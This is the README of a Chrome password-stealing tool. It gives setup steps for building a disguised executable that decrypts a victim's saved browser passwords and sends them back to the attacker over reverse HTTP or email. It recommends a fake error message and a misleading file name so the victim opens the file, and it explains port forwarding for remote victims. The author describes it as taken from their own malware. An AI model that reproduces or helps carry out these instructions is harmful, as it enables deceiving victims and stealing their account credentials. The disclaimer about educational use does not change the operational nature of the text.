# Hacking Chrome Saved Passwords

### Pre Requisites:

(**This script should work for Windows XP all the way to Windows 10, both 32-bit and 64-bit**)

	1. Python 2.7	-  https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi 
			 (It has to be 2.7 32 bit (x86) or it won't work)
			 
	2. PyWin32	-  Installable by runing "pip install pypiwin32"
			 or "C:\Python27\Scripts\pip.exe install pywin32"
			 
	3. Requests	-  Installable by runing "pip install requests" 
			 or "C:\Python27\Scripts\pip.exe install requests"
			 
	4. py2exe 	-  https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/ 
			 (choose the 32-bit version for 2.7)
			 
### **IMPORTANT**: 
Enviroment Variables: Do not forget to include Python27 folder and Scripts folder in PATH environment variable. 


### Features:

	
	1. Grabs Google Chrome saved passwords and decrypts them.
	2. Sends these passwords to the attacker via 
	
		* Email OR, 
		* Saving it on a text file, via HTTP (Passwords are 
		saved in the same directory as the Client launched by the attacker)
		
	3. Option of having a fake Error Message appear
	4. Custom Icon

Victim will open the server and all the Google Chrome Passwords will be sent to the attacker remotely and saved as a text file on the attacker's computer. The connection is done by reverse-http.

PS: This was originally part of one of my malwares so I had to adjust. I didn't have time to clean it up yet that's why it looks so messy.

### Next version will include:
* Firefox Stealer


# Instructions:


## Local Exploitation (If your target is in the same network as you):

	
	1. If you want a custom icon place the icon on the same 
	directory as the scripts and rename it "icon.ico', replacing 
	the file that was already there with the same name. 
	If you don't want a custom icon, *skip this step*.
	
	
	2. If you want a custom icon, place the icon on the same 
	directory as the scripts and rename it "icon.ico', replacing 
	the file that was already there with the same name. 
	If you don't want a custom icon, **skip this step**.
	
	
	
	3. Create server by runing the python script "create_server.py"
	It will then ask you to choose between 2 options, either email or client.exe.
	
		* (1) If you choose email you first need to create an account at https://www.gmx.com/ 
		and then input the created username and password into the program.*
		* (2) If you choose the client.exe, it will ask you for your local ip.
		To find this ip open up CMD and type "ipconfig", it should be listed as IPv4
		
		
	4. Then it will ask you if you want to enable the fake message. 
	This is a fake Error that appears when someone tries to open the program, 
	to make it look more legitimate. Type **Y** if you want to activate it (recommended)
	or **N** if you don't.
	
		
	5. Start the client.exe **Skip this step if you have chosen step number (1) before**
	(I recommend having the client, alongside all other files in a directory in "C:\", like "C:\ChromePass\[all_files]")
	
	
	6. Send the server.exe to your target 
	(choosing an appropriate name is always important)
	
	
	7. You will obtain a password text file in the same location 
	as the client, or in your email depending on how you decided
	with all the Google Chrome Passwords.


## Remote Exploitation (If target is NOT on the same network as you):

	1. If you want a custom icon place the icon on the same directory as the 
	scripts and rename it "icon.ico', replacing the file that was already there with the same name. 
	If you don't want a custom icon, *skip this step*.
	
	
	2. If you want a custom icon, place the icon on the same directory as the scripts 
	and rename it "icon.ico', replacing the file that was already there with the same name. 
	If you don't want a custom icon, **skip this step**.	
	
	
	3. Create server by runing the python script "create_server.py"
	It will then ask you to choose between 2 options, either email or client.exe.
	
		* (1) If you choose email you first need to create an account at https://www.gmx.com/ 
		and then input the created username and password into the program.*
		
		* (2) If you choose the client.exe, it will ask you for your ip.
		 you must type your PUBLIC ip (ex: 152.162.93.12). 
		You can obtain your public ip by typing "WhatIsMyIp" on Google.
	
	
	4. Setup Port forwading. You want to forward the port 80 to your machine 
	(look up how to do that if you don't know), you can use this guide:
	https://www.howtogeek.com/66214/how-to-forward-ports-on-your-router/
	You can then test if your port forwarding was successful using this website:
	http://canyouseeme.org/
	
	
	5. Start the client.exe **Skip this step if you have chosen number (1) before**
	(I recommend having the client, alongside all other files in a directory in 
	"C:\", like "C:\ChromePass\[all_files]")


	6. Send the server.exe to your target 
	(choosing an appropriate name is always important)
	
	
	7. You will obtain a password text file in the same location 
	as the client, or in your email depending on how you decided
	with all the Google Chrome Passwords.
	

	
## NOTE:
	DO NOT change the name of the python scripts or text files. 
	  
	The "attacker_ip.txt" file exists only to create the server.exe. 
	  
	If everything seems to work but you aren't receiving the text file, try moving yor client.exe to 
	C:\ directory (i.e. "C:\client.exe") and run both client and server again.  
	  
	Make sure the client is runing before the server runs. 
	Password text file will be saved in the same diretory as the client.exe file.
	

### Feel free to join my Discord Server: https://discord.gg/qBfC36j

### Any questions open up an issue on GitHub or contact me at: MarioNascimento@ITCrashSecurity.com
#### Please make sure your issue haven't been answered before, to avoid duplicate issues on Github page.


#### DISCLAIMER: I will not be held responsible for the misuse of these scripts. EDUCATIONAL or PROFESSIONAL use only
